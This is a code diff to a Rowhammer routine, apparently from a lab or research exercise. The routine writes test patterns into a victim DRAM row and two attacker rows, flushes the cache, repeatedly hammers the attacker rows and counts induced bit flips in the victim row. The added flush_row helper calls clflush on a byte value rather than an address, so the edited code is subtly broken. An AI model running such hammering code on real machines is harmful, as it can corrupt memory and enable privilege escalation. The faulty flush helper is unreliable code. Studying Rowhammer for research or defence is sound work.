@@ -4,6 +4,13 @@
 #include <unistd.h>
 #include <set>
 
+void flush_row(uint8_t *row) {
+    // 64 byte cache line
+    for (uint32_t index = 0; index < ROW_SIZE; index += 64) {
+        clflush(row[index]);
+    }
+}
+
 uint32_t hammer_addresses(uint64_t vict_virt_addr, uint64_t attacker_virt_addr_1, uint64_t attacker_virt_addr_2) {
 
     // prime
@@ -13,8 +20,10 @@ uint32_t hammer_addresses(uint64_t vict_virt_addr, uint64_t attacker_virt_addr_1
     memset(vict_virt_addr_ptr, 0x55, ROW_SIZE);
     memset(attacker_virt_addr_1_ptr, 0xAA, ROW_SIZE);
     memset(attacker_virt_addr_2_ptr, 0xAA, ROW_SIZE);
-    clflush(attacker_virt_addr_1);
-    clflush(attacker_virt_addr_2);
+    
+    flush_row(vict_virt_addr_ptr);
+    flush_row(attacker_virt_addr_1_ptr);
+    flush_row(attacker_virt_addr_2_ptr);
   
     int num_reads = HAMMERS_PER_ITER;
 
@@ -30,10 +39,11 @@ uint32_t hammer_addresses(uint64_t vict_virt_addr, uint64_t attacker_virt_addr_1
             : "rax"
         );
     }
+
+    flush_row(vict_virt_addr_ptr);
+    
     uint32_t number_of_bitflips_in_target = 0;
     for (uint32_t index = 0; index < ROW_SIZE; index++) {
-        // flush 64 byte cacheline
-        if (index % 64 == 0) clflush((uint64_t)(vict_virt_addr_ptr + index));
         if (vict_virt_addr_ptr[index] != 0x55) {
             number_of_bitflips_in_target++;
         }
